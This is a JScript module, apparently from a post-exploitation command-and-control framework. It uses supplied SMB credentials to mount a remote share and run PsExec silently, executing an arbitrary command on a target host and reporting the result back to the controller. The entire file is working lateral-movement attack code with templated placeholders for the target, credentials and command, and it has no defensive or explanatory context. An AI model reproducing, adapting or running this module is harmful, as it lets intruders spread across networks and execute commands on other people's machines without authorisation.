try
{
    var rpath = "~RPATH~"
    var UNC = "~RPATH~\\psexec.exe ";
    var domain = "~SMBDOMAIN~";
    var user = "~SMBUSER~";
    var pwd = "~SMBPASS~";
    var computer = "\\\\~RHOST~ ";

    UNC += computer;

    if (user != "" && pwd != "")
    {
        if (domain != "")
        {
            user = '"' + domain + "\\" + user + '"';
        }

        UNC += "-u " + user + " -p " + pwd + " ";
    }

    UNC += " -accepteula ~CMD~";

    // crappy hack to make sure it mounts

    var output = proton.shell.exec("net use * " + rpath, "~DIRECTORY~\\"+proton.uuid()+".txt");

    if (output.indexOf("Drive") != -1)
    {
        var drive = output.split(" ")[1];
        proton.shell.run("net use " + drive + " /delete", true);
    }
    proton.WS.Run("%comspec% /q /c " + UNC, 0, true);

    proton.work.report("Complete");
}
catch (e)
{
    proton.work.error(e);
}

proton.exit();
